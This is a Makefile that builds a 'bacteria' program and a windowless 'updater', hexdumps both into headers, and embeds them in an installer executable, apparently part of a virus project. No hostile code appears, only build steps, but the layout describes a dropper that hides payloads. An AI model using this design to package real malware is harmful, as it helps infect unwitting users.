#Makefile for bacteria / updater installer

installer.exe: installer.o
	gcc -o installer.exe installer.o

installer.o: installer.c bacteria.h updater.h virusproject.h
	gcc -c -o installer.o installer.c

updater.h: updater.exe
	hexdump updater.exe updater.h updater

updater.exe: updater.o
	gcc -o updater.exe updater.o -mwindows

updater.o: updater.c bacteria.h virusproject.h
	gcc -c -o updater.o updater.c

bacteria.h: bacteria.exe
	hexdump bacteria.exe bacteria.h bacteria

bacteria.exe: bacteria.o randfilelib.o
	gcc -o bacteria.exe bacteria.o randfilelib.o

bacteria.o: bacteria.c
	gcc -c -o bacteria.o bacteria.c

randfilelib.o: randfilelib.c
	gcc -c -o randfilelib.o randfilelib.c

.PHONY: clean

clean:
	rm -f installer.exe bacteria.exe updater.exe bacteria.h updater.h bacteria.o randfilelib.o updater.o installer.o
